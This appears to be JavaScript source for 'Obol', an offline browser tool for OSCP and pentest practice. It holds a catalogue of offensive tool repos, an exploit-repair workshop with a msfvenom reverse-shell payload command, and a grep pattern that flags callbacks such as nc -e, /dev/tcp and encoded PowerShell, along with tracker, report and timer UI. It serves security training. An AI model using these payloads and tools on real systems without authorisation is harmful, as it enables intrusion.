    ['ligolo-ng','https://github.com/nicocha30/ligolo-ng','The modern pivot: tun interface, routed subnets.'],
    ['chisel','https://github.com/jpillora/chisel','HTTP-tunneled SOCKS + port forwards, single binary.'],
    ['sshuttle','https://github.com/sshuttle/sshuttle','VPN-over-SSH, zero server-side install beyond python.'],
    ['dnscat2','https://github.com/iagox86/dnscat2','C2/tunnel over DNS.'],
    ['rpivot','https://github.com/klsecservices/rpivot','Reverse SOCKS over HTTP from the target back to you.'],
    ['ptunnel-ng','https://github.com/utoni/ptunnel-ng','TCP over ICMP echo.'],
    ['SocksOverRDP','https://github.com/nccgroup/SocksOverRDP','SOCKS through your RDP virtual channel.']
  ]],
  ['Shells & Payloads', [
    ['penelope','https://github.com/brightio/penelope','Reverse-shell handler: auto-PTY upgrade, multi-session, upload/download/portfwd, survives Ctrl+C. Replaces nc on exams.'],
    ['Metasploit','https://github.com/rapid7/metasploit-framework','msfconsole/msfvenom/meterpreter.'],
    ['evil-winrm','https://github.com/Hackplayers/evil-winrm','The WinRM shell.'],
    ['pwncat-cs','https://github.com/calebstewart/pwncat','Handler + auto-enum + persistence-aware shell.'],
    ['Web-Shells collection','https://github.com/jbarcia/Web-Shells','laudanum + friends; Kali ships /usr/share/webshells.'],
    ['mona','https://github.com/corelan/mona','Immunity/WinDbg plugin for BOF dev.']
  ]],
  ['Reference Sites (bookmarked forever)', [
    ['revshells.com','https://www.revshells.com/','Reverse/bind shell generator — every language, one page.'],
    ['LOLBAS','https://lolbas-project.github.io/','Windows living-off-the-land binaries: what native exe can download/execute/evade.'],
    ['GTFOBins','https://gtfobins.github.io/','Unix binaries that give shells/root when SUID/sudo.'],
    ['HackTricks','https://book.hacktricks.wiki/','The technique encyclopedia.'],
    ['The Hacker Recipes','https://www.thehacker.recipes/','AD-focused technique cookbook.'],
    ['PayloadsAllTheThings','https://github.com/swisskyrepo/PayloadsAllTheThings','Web payload bible.'],
    ['ired.team','https://www.ired.team/','Red team TTP notes with code.'],
    ['SecLists','https://github.com/danielmiessler/SecLists','The wordlists (installed at /usr/share/seclists).'],
    ['Exploit-DB','https://www.exploit-db.com/','Public exploits (searchsploit is the offline copy).'],
    ['HijackLibs','https://hijacklibs.net/','DLLs known to be hijackable, per application.']
  ]]
];
function toolReposHTML(){
  let h = '<h3 style="color:var(--accent2);margin-bottom:6px">Tool Repos &amp; Reference Sites</h3>'
    + '<p class="subtitle">Source repos for the tools Obol references — bookmark, read the README (that is where the flags you forgot live), and git clone when Kali\u2019s packaged version lags. Cards also carry per-card repo links in their refs row.</p>';
  for (const [cat, items] of TOOL_REPOS){
    h += '<div class="card" style="margin-bottom:14px"><h4 style="color:var(--accent);margin-bottom:8px">' + esc(cat) + '</h4>';
    for (const [name, url, note] of items)
      h += '<div class="wl-item"><b><a href="' + esc(url) + '" target="_blank" rel="noopener" style="color:var(--accent)">' + esc(name) + '</a></b><br><code>' + esc(url) + '</code><div class="note">→ ' + esc(note) + '</div></div>';
    h += '</div>';
  }
  return h;
}

function hashHelpersHTML(){
  let h = '<h3 style="color:var(--accent2);margin-bottom:6px">Hash &amp; File Helpers</h3>'
    + '<p class="subtitle">Protected file → converter → cracker/mode. The *2john tools ship with john; install with <code>apt install john</code>. See the file-to-hash card for usage patterns.</p>'
    + '<table class="tracker"><thead><tr><th>Protected file</th><th>Convert to hash</th><th>Crack with</th><th>Note</th></tr></thead><tbody>';
  for (const r of HASH_HELPERS){
    h += '<tr><td>' + esc(r.file) + '</td><td><code style="font-family:var(--mono);color:var(--accent)">' + esc(renderCmd(r.conv)) + '</code></td><td><code style="font-family:var(--mono);color:var(--accent)">' + esc(renderCmd(r.crack)) + '</code></td><td class="hint">' + esc(r.note) + '</td></tr>';
  }
  h += '</tbody></table><p class="hint" style="margin-top:10px">Identify an unknown hash first: hashid / name-that-hash (nth) — see the Hash Identification card.</p>';
  return h;
}

function scriptsHTML(){
  let h = '<h3 style="color:var(--accent2);margin-bottom:6px">Copy/Paste Script Library</h3>'
    + '<p class="subtitle">Field-tested scripts distilled from the OSCP/HTB notes. Sidebar parameters ({{lhost}}, {{lport}}, {{target}}…) fill in automatically. Each script tells you <b>when</b> to reach for it, <b>where</b> to run it (Kali vs target), and <b>how</b>. Paste into your session or save to file on target.</p>';
  const cats = [...new Set(window.OBOL_SCRIPTS.map(s => s.cat))];
  for (const cat of cats){
    h += '<h4 style="color:var(--accent);margin:16px 0 8px">' + esc(cat) + '</h4>';
    for (const s of window.OBOL_SCRIPTS.filter(x => x.cat === cat)){
      h += '<div class="cmd-block"><span class="tool">' + esc(s.lang) + '</span><button class="copy-btn" data-copy>Copy</button><br>'
        + '<b style="color:var(--accent2)">' + esc(s.name) + '</b>'
        + '<div class="note" style="margin:4px 0">→ ' + esc(s.desc) + '</div>'
        + '<div class="script-meta">'
        + (s.when ? '<div><span class="script-tag">WHEN</span> ' + esc(s.when) + '</div>' : '')
        + (s.where ? '<div><span class="script-tag">WHERE</span> ' + esc(s.where) + '</div>' : '')
        + (s.how ? '<div><span class="script-tag">HOW</span> ' + esc(s.how) + '</div>' : '')
        + '</div>'
        + '<code>' + esc(renderCmd(s.code)) + '</code></div>';
    }
  }
  return h;
}

// ---------- exploit workshop ----------
// Reference bench for fixing downloaded exploits. Sections of cmd-blocks.
const EXPLOIT_WORKSHOP = [
  ['1 · Acquire & backdoor-check (before anything runs)', [
    ['sh', 'searchsploit -m 50383', 'Mirror to cwd (-m). Never edit /usr/share/exploitdb in place. -x examines first. Official exploit-db/gitlab beats a random gist.'],
    ['sh', 'file exploit.py && head -30 exploit.py', 'What did you actually get? python2? CRLF? HTML error page saved as .py (more common than you think)?'],
    ['sh', "grep -nE '([0-9]{1,3}\\.){3}[0-9]{1,3}|curl |wget |nc -e|/dev/tcp|certutil|powershell.*-enc|base64 -d|Invoke-|socket' exploit.py", 'BACKDOOR CHECK. Any IP that is not yours = callback to the author. Any base64 blob = decode it and read it before running. Backdoored PoCs are a real, documented scam.'],
  ]],
  ['2 · Line endings & encoding (the silent killers)', [
    ['sh', "sed -i 's/\\r$//' exploit.py", 'CRLF → LF. Symptom: /usr/bin/env: ‘python\\r’: No such file or directory, or weird syntax errors on line 1.'],
    ['sh', "sed -i '1s/^\\xEF\\xBB\\xBF//' exploit.py", 'Strip a UTF-8 BOM — symptom: SyntaxError on the very first character.'],
    ['sh', 'expand -t 4 exploit.py > fixed.py', 'Tabs/space mixing → IndentationError. tabnanny finds them: python3 -m tabnanny exploit.py'],
  ]],
  ['3 · python2 → python3', [
    ['sh', 'python3 exploit.py', 'Run it FIRST and read the first error — half of “broken” exploits are one print statement.'],
    ['sh', '2to3 -w exploit.py', 'Automated port. Then review: git diff-style, line by line. It fixes print, except-as, raw_input, urllib.'],
    ['sh', "sed -i \"s/print '\\(.*\\)'/print('\\\\1')/g; s/raw_input/input/g\" exploit.py", 'The two manual fixes that cover 80% of py2 exploits, if you would rather not run 2to3.'],
  ]],
  ['4 · Patch the payload values', [
    ['sh', "grep -nEi 'lhost|lport|rhost|10\\.|192\\.168\\.|4444' exploit.py", 'Find every hardcoded callback and target value before touching anything.'],
    ['sh', "sed -i \"s/10\\.11\\.0\\.4/{{lhost}}/g; s/4444/{{lport}}/g\" exploit.py", 'Swap in YOUR values. Sidebar params substitute here automatically.'],
    ['sh', "msfvenom -p windows/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f python -b '\\x00\\x0a\\x0d'", 'BOF exploits: never hand-edit shellcode. Regenerate the payload block with the exploit’s bad-char list and paste it over the old buf.'],
  ]],
  ['5 · Compile (when it is C / C#)', [
    ['sh', 'gcc exploit.c -o exploit', 'Linux target. Add -m32 for 32-bit targets (sudo apt install gcc-multilib). Missing headers → apt the -dev package in the error.'],
    ['sh', 'x86_64-w64-mingw32-gcc exploit.c -o exploit.exe', 'Cross-compile a Windows exe from kali (sudo apt install mingw-w64). i686-w64-mingw32-gcc for 32-bit Windows.'],
    ['sh', 'i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32', 'Winsock exploits need the library link flag. “undefined reference to WSAStartup” = you forgot it.'],
  ]],
  ['6 · Document it (OSCP rule)', [
    ['sh', 'diff -u exploit-orig.py exploit.py > my-changes.patch', 'Unmodified public exploit → the URL suffices in the report. ANY change → full modified code + diff + WHY each change was needed. Keep this patch from the moment you start editing.'],
  ]],
];
function exploitWorkshopHTML(){
  let h = '<h3 style="color:var(--accent2);margin-bottom:6px">Exploit Workshop</h3>'
    + '<p class="subtitle">Downloaded a PoC from a random GitHub and it will not run? Work the bench top to bottom: backdoor-check → line endings → python2→3 → patch payload values → compile → document. This is the companion to the Exploit Cleaning &amp; Repair card. Sidebar params substitute into the commands.</p>';
  for (const [title, cmds] of EXPLOIT_WORKSHOP){
    h += '<div class="card" style="margin-bottom:14px"><h4 style="color:var(--accent);padding:12px 16px 0">' + esc(title) + '</h4><div class="card-body" style="border-top:none">';
    for (const [tool, run, note] of cmds)
      h += '<div class="cmd-block"><span class="tool">' + esc(tool) + '</span><button class="copy-btn" data-copy>Copy</button><br><code>' + esc(renderCmd(run)) + '</code><div class="note">→ ' + esc(note) + '</div></div>';
    h += '</div></div>';
  }
  h += '<div class="nudge">Golden rule: if you cannot explain every line of an exploit, do not run it — read it first. On the exam, one hardcoded callback to the author is a very bad day.</div>';
  return h;
}

function viewTools(tool){
  // Aggregate every command across every card, grouped by tool. The per-tool armory.
  const entries = [];
  for (const l of LANES) for (const c of l.cards) for (const cmd of c.commands)
    entries.push({ tool: cmd.tool, card: c, cmd });
  const tools = [...new Set(entries.map(e => e.tool))].sort((a,b) => a.localeCompare(b));
  if (!tool) tool = '__wordlists';
  let html = '<h2>Tools</h2><p class="subtitle">Every command in Obol, grouped by tool. Parameters fill from the sidebar; tool names in any card jump here. Commands carry the same option switches as the cards — tick flags / fill args and the command (and your copy) updates. The five pinned tabs are reference libraries: wordlists, hash converters, repos, copy/paste scripts, and the exploit-repair workbench.</p>'
    + '<input class="search" id="tool-search" placeholder="Filter commands…">'
    + '<div class="lane-tabs">'
    + '<span class="lane-tab' + (tool === '__wordlists' ? ' active' : '') + '" data-tool="__wordlists">📖 Wordlists</span>'
    + '<span class="lane-tab' + (tool === '__hashhelpers' ? ' active' : '') + '" data-tool="__hashhelpers">#️⃣ Hash helpers</span>'
    + '<span class="lane-tab' + (tool === '__repos' ? ' active' : '') + '" data-tool="__repos">🔗 Repos &amp; refs</span>'
    + '<span class="lane-tab' + (tool === '__scripts' ? ' active' : '') + '" data-tool="__scripts">📜 Scripts</span>'
    + '<span class="lane-tab' + (tool === '__exploit' ? ' active' : '') + '" data-tool="__exploit">🧰 Exploit workshop</span>'
    + tools.map(t => '<span class="lane-tab' + (t === tool ? ' active' : '') + '" data-tool="' + esc(t) + '">' + esc(t) + '</span>').join('')
    + '</div><div id="tool-body"></div>';
  $('#view').innerHTML = html;

  const draw = () => {
    if (tool === '__wordlists' || tool === '__hashhelpers' || tool === '__repos' || tool === '__scripts' || tool === '__exploit'){
      $('#tool-search').style.display = 'none';
      $('#tool-body').innerHTML = tool === '__wordlists' ? wordlistArmoryHTML() : (tool === '__repos' ? toolReposHTML() : (tool === '__scripts' ? scriptsHTML() : (tool === '__exploit' ? exploitWorkshopHTML() : hashHelpersHTML())));
      $('#tool-body').querySelectorAll('[data-copy]').forEach(b => b.addEventListener('click', e => { e.stopPropagation(); copyWithNudge(b); }));
      return;
    }
    $('#tool-search').style.display = '';
    const query = $('#tool-search').value.toLowerCase();
    const facts = factsSet();
    let list = entries;
    if (tool) list = list.filter(e => e.tool === tool);
    if (query) list = list.filter(e => (e.cmd.run + ' ' + e.cmd.note + ' ' + e.card.title).toLowerCase().includes(query));
    let body = '';
    if (tool){
      const all = list.map(e => renderCmd(e.cmd.run)).join('\n');
      body += '<div class="card-actions" style="margin-bottom:12px"><button class="btn" id="copy-tool">Copy all ' + esc(tool) + ' commands (' + list.length + ')</button></div>';
      body += '<div class="cmd-block"><code>' + esc(all) + '</code></div>';
    }
    // grouped by card for context
    const byCard = {};
    for (const e of list){ (byCard[e.card.id] = byCard[e.card.id] || []).push(e); }
    for (const [cid, arr] of Object.entries(byCard)){
      const c = arr[0].card;
      body += '<div class="card"><div class="card-head" data-card="' + c.id + '"><span class="badge ' + (applicable(c, facts) ? 'applicable' : 'new') + '">' + (applicable(c, facts) ? 'applicable' : 'card') + '</span> <span class="title">' + esc(c.title) + '</span> <span class="hint">' + esc(c.lane) + '</span></div><div class="card-body">';
      for (const e of arr){
        const oi = c.commands.indexOf(e.cmd);
        const ost = optsState(c.id, oi);
        body += '<div class="cmd-block" data-oid="' + esc(c.id + ':' + oi) + '"><span class="tool">' + esc(e.cmd.tool) + '</span><button class="copy-btn" data-copy>Copy</button><br><code>' + esc(renderCmdWithOpts(e.cmd, ost)) + '</code>'
          + (e.cmd.note ? '<div class="note">→ ' + esc(e.cmd.note) + '</div>' : '')
          + optsHTML(c, e.cmd, oi, ost) + '</div>';
      }
      body += '</div></div>';
    }
    $('#tool-body').innerHTML = body || '<p class="empty">No commands match.</p>';
    $('#tool-body').querySelectorAll('[data-copy]').forEach(b => b.addEventListener('click', e => {
      e.stopPropagation();
      copyWithNudge(b);
    }));
    $('#tool-body').querySelectorAll('.cmd-opts input').forEach(inp => inp.addEventListener('input', () => {
      const block = inp.closest('.cmd-block');
      const cardId = block.closest('.card').querySelector('.card-head').dataset.card;
      const oi = +block.dataset.oid.split(':').pop();
      const c = CARDS[cardId];
      const cmd = c.commands[oi];
      const ost = optsState(cardId, oi);
      block.querySelectorAll('.cmd-opts input').forEach(x => {
        if (x.dataset.optflag !== undefined){ if (x.checked) ost.f[x.dataset.optflag] = true; else delete ost.f[x.dataset.optflag]; }
        else ost.a[x.dataset.optarg] = x.value;
      });
      save();
      block.querySelector('code').textContent = renderCmdWithOpts(cmd, ost);
    }));
    $('#tool-body').querySelectorAll('.card-head').forEach(h => h.addEventListener('click', () => location.hash = '#/card/' + h.dataset.card));
    const ct = $('#copy-tool');
    if (ct) ct.onclick = () => { navigator.clipboard.writeText(list.map(e => renderCmd(e.cmd.run)).join('\n')).then(() => { ct.textContent = 'Copied'; setTimeout(() => ct.textContent = 'Copy all ' + tool + ' commands (' + list.length + ')', 1200); }); };
  };
  $('#tool-search').addEventListener('input', draw);
  $('#view').querySelectorAll('.lane-tab').forEach(t => t.addEventListener('click', () => location.hash = '#/tools/' + encodeURIComponent(t.dataset.tool)));
  draw();
}

function viewBoxes(){
  let html = '<h2>Box Tracker</h2><p class="subtitle">One row per target. Everything saves locally and feeds the report. <b>Ingest nmap scan</b>: paste -oN/-oG/-oX output → hosts, ports and service versions auto-fill, and banners get matched against known CVEs in the report. <b>Ingest BloodHound</b>: drop SharpHound/CE zips, JSONs, or PlumHound CSVs → attack paths found, target lists built, matching cards linked.</p>'
    + '<div class="card-actions no-print" style="margin-bottom:14px">'
    + '<button class="btn" id="add-box">+ Add box</button>'
    + '<button class="btn" id="nmap-paste">Ingest nmap scan</button>'
    + '<button class="btn" id="bh-paste">Ingest BloodHound</button></div>'
    + '<table class="tracker"><thead><tr><th>Box</th><th>Creds</th><th>Flags</th><th>What pwned it</th><th></th></tr></thead><tbody>';
  state.boxes.forEach((b, i) => {
    html += '<tr>'
      + '<td><input data-b="' + i + '" data-f="name" value="' + esc(b.name || '') + '" placeholder="name">'
      + '<input data-b="' + i + '" data-f="ip" value="' + esc(b.ip || '') + '" placeholder="ip">'
      + '<input data-b="' + i + '" data-f="hostname" value="' + esc(b.hostname || '') + '" placeholder="hostname">'
      + '<input data-b="' + i + '" data-f="domain" value="' + esc(b.domain || '') + '" placeholder="domain">'
      + '<input data-b="' + i + '" data-f="os" value="' + esc(b.os || '') + '" placeholder="os">'
      + (b.ports && b.ports.length ? '<div class="hint">ports: ' + b.ports.map(p => p.port + '/' + (p.service||'')).join(', ') + '</div>' : '')
      + '</td>'
      + '<td>' + (b.creds||[]).map((c, j) => '<div class="cred-row"><input data-b="' + i + '" data-cred="' + j + '" data-f="user" value="' + esc(c.user) + '" placeholder="user"><input data-b="' + i + '" data-cred="' + j + '" data-f="secret" value="' + esc(c.secret) + '" placeholder="pass/hash"><input data-b="' + i + '" data-cred="' + j + '" data-f="source" value="' + esc(c.source) + '" placeholder="found via"></div>').join('')
      + '<button class="btn" data-addcred="' + i + '">+ cred</button></td>'
      + '<td>' + (b.flags||[]).map((f, j) => '<div class="flag-row"><input data-b="' + i + '" data-flag="' + j + '" data-f="label" value="' + esc(f.label) + '" placeholder="user/root" style="max-width:70px"><input data-b="' + i + '" data-flag="' + j + '" data-f="value" value="' + esc(f.value) + '" placeholder="flag"></div>').join('')
      + '<button class="btn" data-addflag="' + i + '">+ flag</button></td>'
      + '<td><textarea data-b="' + i + '" data-f="pwned" rows="2" placeholder="attack path summary">' + esc(b.pwned || '') + '</textarea>'
      + '<textarea data-b="' + i + '" data-f="notes" rows="2" placeholder="notes">' + esc(b.notes || '') + '</textarea></td>'
      + '<td><button class="btn" data-delbox="' + i + '">✕</button></td>'
      + '</tr>';
  });
  html += '</tbody></table>';
  if (!state.boxes.length) html += '<p class="empty">No boxes yet. Add one, or ingest an nmap scan to auto-create them.</p>';
  $('#view').innerHTML = html;

  $('#add-box').onclick = () => { state.boxes.push({ name:'', ip:'', hostname:'', domain:'', os:'', creds:[], flags:[], notes:'', pwned:'', ports:[] }); save(); viewBoxes(); };
  $('#nmap-paste').onclick = nmapModal;
  $('#bh-paste').onclick = () => window.OBOL_BH.modal({ state, save, esc, modal, closeModal, renderSidebar, route, toast });
  $('#view').querySelectorAll('input[data-b], textarea[data-b]').forEach(el => el.addEventListener('input', () => {
    const b = state.boxes[+el.dataset.b];
    if (el.dataset.cred !== undefined) b.creds[+el.dataset.cred][el.dataset.f] = el.value;
    else if (el.dataset.flag !== undefined) b.flags[+el.dataset.flag][el.dataset.f] = el.value;
    else b[el.dataset.f] = el.value;
    save();
  }));
  $('#view').querySelectorAll('[data-addcred]').forEach(b => b.onclick = () => { state.boxes[+b.dataset.addcred].creds = state.boxes[+b.dataset.addcred].creds || []; state.boxes[+b.dataset.addcred].creds.push({user:'',secret:'',source:'',validated:false}); save(); viewBoxes(); });
  $('#view').querySelectorAll('[data-addflag]').forEach(b => b.onclick = () => { state.boxes[+b.dataset.addflag].flags = state.boxes[+b.dataset.addflag].flags || []; state.boxes[+b.dataset.addflag].flags.push({label:'',value:''}); save(); viewBoxes(); });
  $('#view').querySelectorAll('[data-delbox]').forEach(b => b.onclick = () => { if (confirm('Delete this box?')) { state.boxes.splice(+b.dataset.delbox,1); save(); viewBoxes(); } });
}

function nmapModal(){
  modal('<h3>Ingest nmap scan</h3><p class="hint">Paste nmap output — normal (-oN), grepable (-oG), or XML (-oX) all work. Hosts get added to the tracker and their ports become facts.</p>'
    + '<textarea class="bigpaste" id="nmap-in" placeholder="Nmap scan report for 10.10.11.5&#10;PORT   STATE SERVICE VERSION&#10;22/tcp open  ssh ..."></textarea>'
    + '<div class="modal-actions"><button class="btn" id="nmap-go">Ingest</button></div>');
  $('#modal-close').onclick = closeModal;
  $('#nmap-go').onclick = () => {
    const res = window.OBOL_NMAP.parse($('#nmap-in').value);
    if (!res.hosts.length){ alert('No hosts with open ports found in that paste.'); return; }
    for (const h of res.hosts){
      if (!state.boxes.some(b => b.ip === h.ip))
        state.boxes.push({ name:'', ip:h.ip, hostname:h.hostname, domain:'', os:'', creds:[], flags:[], notes:'', pwned:'', ports:h.ports });
      else {
        const b = state.boxes.find(x => x.ip === h.ip);
        b.ports = h.ports; if (h.hostname) b.hostname = h.hostname;
      }
    }
    for (const f of res.facts) if (!state.facts.includes(f)) state.facts.push(f);
    if (res.hosts[0] && !state.params.target) state.params.target = res.hosts[0].ip;
    save(); renderSidebar(); closeModal();
    modal('<h3>Ingested</h3><p>' + res.hosts.length + ' host(s), ' + res.facts.length + ' facts set.</p><pre class="report">' + esc(res.facts.join('\n')) + '</pre>');
    $('#modal-close').onclick = closeModal;
  };
}

function viewReport(){
  state.ui.reportMode = state.ui.reportMode || 'standard';
  const mode = state.ui.reportMode;
  const md = window.OBOL_REPORT.generate(state, LANES, mode);
  const doneCount = Object.values(state.progress).filter(p => p.status === 'done').length;
  const nudge = doneCount === 0
    ? '<div class="nudge">⚠ Nothing is marked yet — this report will be nearly empty. As you work: open a card, run its commands, paste key output into the evidence box, and hit <b>Mark succeeded</b>. The report assembles itself from those marks.</div>'
    : '';
  const explainer = mode === 'oscp'
    ? 'OSCP mode: per-target sections, reproducible steps, proof-file checklist, and the OffSec submission rules (PDF in unencrypted .7z, exact filename, MD5 verify, Metasploit on one machine max). Fill the per-host sections from your box tracker, add screenshots, export to PDF from the OffSec template.'
    : 'Standard mode: client-style findings with severity, MITRE ATT&CK mapping, known-CVE correlation from your nmap-ingested service banners, remediations, and detection notes. Paste into your firm\'s template.';
  $('#view').innerHTML = '<h2>Report Draft</h2><p class="subtitle">' + explainer + '</p>' + nudge
    + '<div class="card-actions no-print" style="margin-bottom:14px">'
    + '<button class="btn' + (mode === 'standard' ? ' mode-on' : '') + '" data-rmode="standard">Standard pentest report</button>'
    + '<button class="btn' + (mode === 'oscp' ? ' mode-on' : '') + '" data-rmode="oscp">OSCP exam report</button>'
    + '<button class="btn" id="dl-md">Download .md</button>'
    + '<button class="btn" id="print">Print / save as PDF</button></div>'
    + '<pre class="report">' + esc(md) + '</pre>';
  $('#view').querySelectorAll('[data-rmode]').forEach(b => b.onclick = () => { state.ui.reportMode = b.dataset.rmode; save(); viewReport(); });
  $('#dl-md').onclick = () => window.OBOL_REPORT.download('obol-report-' + (mode === 'oscp' ? 'oscp-' : '') + new Date().toISOString().slice(0,10) + '.md', md);
  $('#print').onclick = () => window.print();
}

function viewGuide(){
  const sec = (title, body, open) => '<details class="guide-sec"' + (open ? ' open' : '') + '><summary>' + esc(title) + '</summary><div class="guide-body">' + body + '</div></details>';
  const li = (a) => '<li>' + a + '</li>';
  let html = '<h2>Guide</h2><p class="subtitle">Everything Obol does, in order of how much you need it. Read the first section and you can work a box; open the rest as you hit them.</p>';

  html += sec('① The 60-second version',
    '<ol class="guide-list">'
    + li('Fill the sidebar <b>parameters</b> (left / ⚙ menu on mobile) — <code>target</code>, <code>lhost</code>, <code>domain</code>… Grey example text in each box shows what good input looks like.')
    + li('<a href="#/boxes">Boxes</a> → <b>Ingest nmap scan</b> — paste your <code>nmap -sV</code> output. Hosts, ports and service banners auto-fill, and matching cards light up.')
    + li('Work cards from <a href="#/map">Map</a> or <a href="#/lanes">Lanes</a>: run the commands yourself, paste key output into the card\'s <b>evidence box</b>, hit <b>Mark succeeded</b>.')
    + li('Open <a href="#/report">Report</a> — your draft assembled itself from those marks. Download .md or print to PDF.')
    + li('Click the <b>timer</b> in the header → countdown for an exam window (OSCP = 23h 45m), stopwatch for labs.')
    + '</ol><p class="hint">Obol never runs anything for you. Every command is copy → paste into your own terminal → paste results back. That is deliberate: it keeps the tool exam-legal and keeps you learning the commands.</p>', true);

  html += sec('② The sidebar: parameters & facts',
    '<p><b>Parameters</b> are fill-in blanks for every command. Set <code>lhost</code> once and every reverse shell, listener and file-transfer command in the app carries your IP. They persist across reloads. The <i>advanced</i> section holds the niche ones (CA names, SIDs, template names…).</p>'
    + '<p><b>Facts</b> are things that are true about the engagement right now — <code>port:445</code>, <code>credential.available</code>, <code>foothold.linux</code>. They drive what Obol shows you:</p>'
    + '<ul class="guide-list">'
    + li('A card whose prerequisites match your facts is marked <span class="badge applicable">applicable</span>.')
    + li('nmap ingest sets port/service facts automatically.')
    + li('Marking a card <b>succeeded</b> adds the facts that technique produces (a shell, a hash, a user) — which lights up the next cards.')
    + li('Add facts by hand in the sidebar box; click a fact pill to remove it.')
    + '</ul>');

  html += sec('③ Anatomy of a card',
    '<ul class="guide-list">'
    + li('<b>Hypothesis</b> — when this technique is worth your time and when it isn\'t.')
    + li('<b>Variant pills</b> (some cards) — same technique, several ways. e.g. ligolo-ng vs chisel. Pick per situation; your choice persists.')
    + li('<b>Command blocks</b> — copy button top-right. Parameters substitute automatically.')
    + li('<b>Option switches</b> — checkboxes add flags (<code>-u</code>, <code>-k</code>…), text fields fill arguments. The command rewrites itself before you copy it.')
    + li('<b>Success looks like / If it fails</b> — the output to expect, and the next card to branch to when a signature failure appears.')
    + li('<b>Evidence box + Mark tried / succeeded</b> — the single most important habit. Evidence + marks are what the report is built from.')
    + li('<b>Defender\'s view</b> — what the blue team sees; becomes the detection note in client reports.')
    + '</ul>');

  html += sec('④ The views, one line each',
    '<ul class="guide-list">'
    + li('<b>Map</b> — the engagement lifecycle as phases, plus "where am I?" states that list cards applicable from your current position.')
    + li('<b>Lanes</b> — all technique cards grouped by phase, searchable.')
    + li('<b>Tools</b> — every command in Obol grouped by tool (the nxc armory lives here), plus four reference tabs: <b>Wordlists</b>, <b>Hash helpers</b> (file → hash → crack mode), <b>Repos &amp; refs</b>, and <b>Scripts</b> (copy/paste helpers with WHEN/WHERE/HOW).')
    + li('<b>Boxes</b> — target tracker: creds, flags, what pwned it. Also where nmap and BloodHound ingest live.')
    + li('<b>Stuck?</b> — everything applicable that you haven\'t finished, plus branches from things you tried that failed.')
    + li('<b>Report</b> — two modes: <b>Standard</b> (client-style findings with severity, MITRE/CVE/NIST/CWE references, remediation) and <b>OSCP</b> (per-target sections, reproducible steps, proof checklist, submission rules).')
    + li('<b>Data</b> — export/import your whole workspace as JSON. Everything lives in your browser; export before you close a long engagement.')
    + '</ul>');

  html += sec('⑤ BloodHound & PlumHound ingest',
    '<p>Boxes → <b>Ingest BloodHound</b> accepts SharpHound/BloodHound CE <code>.zip</code>, loose JSON, or PlumHound <code>--csv</code> exports. Obol parses it locally (nothing leaves the browser) and gives you: attack-path findings with a suggested next card, and copyable <b>target lists</b> (kerberoastable users, AS-REP roastable, DCSync principals) — save one as <code>users.txt</code>, set it as your <code>userlist</code> parameter, and the roasting commands are ready. Domain and base_dn auto-fill from the data.</p>');

  html += sec('⑥ Working a lab vs working the OSCP exam',
    '<ul class="guide-list">'
    + li('Timer: 23h45m countdown, and the OSCP report mode includes the OffSec pre-submission checklist (PDF → unencrypted .7z, exact filename, MD5).')
    + li('Fill <code>osid</code> in advanced params — it lands on the OSCP report header.')
    + li('sqlmap is <b>not allowed</b> on the exam — the Web lane carries full manual SQLi methodology; the sqlmap card is flagged accordingly. Metasploit/Meterpreter: one target max — Obol keeps manual variants on every lane.')
    + li('No AI assistants during the exam; Obol is a static offline ledger of your own methodology — treat it as your notes, and verify what is permitted with OffSec rules before exam day.')
    + '</ul>');

  $('#view').innerHTML = html;
}

function viewSettings(){
  $('#view').innerHTML = '<h2>Data & Workspace</h2><p class="subtitle">Everything lives in your browser (localStorage). Export regularly.</p>'
    + '<div class="card-actions no-print">'
    + '<button class="btn" id="exp">Export workspace JSON</button>'
    + '<button class="btn" id="imp-btn">Import workspace JSON</button>'
    + '<input type="file" id="imp" accept=".json" class="hidden" style="display:none">'
    + '<button class="btn" id="timer-set">Exam / lab timer</button>'
    + '<button class="btn" id="wipe" style="border-color:var(--danger);color:var(--danger)">Wipe everything</button>'
    + '</div><br><p class="hint">Timer lives in the header — click it there for countdown or stopwatch mode.</p>';
  $('#exp').onclick = () => window.OBOL_REPORT.download('obol-workspace-' + new Date().toISOString().slice(0,10) + '.json', JSON.stringify(state, null, 2));
  $('#imp-btn').onclick = () => $('#imp').click();
  $('#imp').onchange = e => {
    const f = e.target.files[0]; if (!f) return;
    const r = new FileReader();
    r.onload = () => { try { state = JSON.parse(r.result); save(); renderSidebar(); route(); } catch(err){ alert('Not a valid Obol workspace file.'); } };
    r.readAsText(f);
  };
  $('#timer-set').onclick = timerModal;
  $('#wipe').onclick = () => { if (confirm('Really wipe all Obol data?')) { localStorage.removeItem(LS_KEY); load(); renderSidebar(); route(); } };
}

// ---------- timer ----------
// state.timerEnd = countdown target ms; state.timerStart = stopwatch start ms. Only one at a time.
function timerModal(){
  const running = !!(state.timerEnd || state.timerStart);
  modal('<h3>Exam / lab timer</h3><p class="hint">Shows in the header and persists across reloads. Countdown for a real exam window (OSCP = 23h 45m), stopwatch for lab boxes when you just want to know how long it took.</p>'
    + '<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin:14px 0">'
    + '<input id="t-h" type="number" min="0" max="99" value="23" style="width:66px;padding:8px;background:var(--bg);border:1px solid var(--line);border-radius:8px;color:var(--text)"> <span class="hint">hours</span>'
    + '<input id="t-m" type="number" min="0" max="59" value="45" style="width:66px;padding:8px;background:var(--bg);border:1px solid var(--line);border-radius:8px;color:var(--text)"> <span class="hint">minutes</span>'
    + '</div><div style="display:flex;gap:8px;flex-wrap:wrap">'
    + '<button class="btn" id="t-down">▾ Start countdown</button>'
    + '<button class="btn" id="t-up">▴ Start stopwatch</button>'
    + (running ? '<button class="btn" id="t-stop" style="border-color:var(--danger);color:var(--danger)">Stop / clear</button>' : '')
    + '</div>');
  $('#t-down').onclick = () => {
    const ms = ((+$('#t-h').value || 0) * 3600 + (+$('#t-m').value || 0) * 60) * 1000;
    if (ms <= 0){ alert('Set a duration above zero.'); return; }
    state.timerEnd = Date.now() + ms; delete state.timerStart; save(); closeModal();
  };
  $('#t-up').onclick = () => { state.timerStart = Date.now(); delete state.timerEnd; save(); closeModal(); };
  const stop = $('#t-stop');
  if (stop) stop.onclick = () => { delete state.timerEnd; delete state.timerStart; save(); closeModal(); };
}
$('#timer').addEventListener('click', timerModal);
setInterval(() => {
  const el = $('#timer');
  let d;
  if (state.timerEnd){ d = Math.max(0, state.timerEnd - Date.now()); el.style.color = d === 0 ? 'var(--danger)' : ''; el.textContent = '▾ ' + fmtT(d); return; }
